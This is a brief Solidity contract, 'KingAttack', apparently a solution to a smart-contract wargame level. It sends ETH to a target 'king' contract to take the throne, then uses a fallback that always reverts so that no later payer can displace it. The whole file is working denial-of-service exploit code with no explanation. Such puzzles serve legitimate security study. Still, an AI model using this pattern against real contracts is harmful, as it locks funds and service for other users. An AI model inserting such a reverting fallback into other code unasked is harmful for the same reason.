// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address _kingAddress) public payable {
        address(_kingAddress).call{value: msg.value}("");
    }

    // Fallback is called when the king sends ETH to this contract.
    fallback() external payable {
        revert(":)");
    }
}
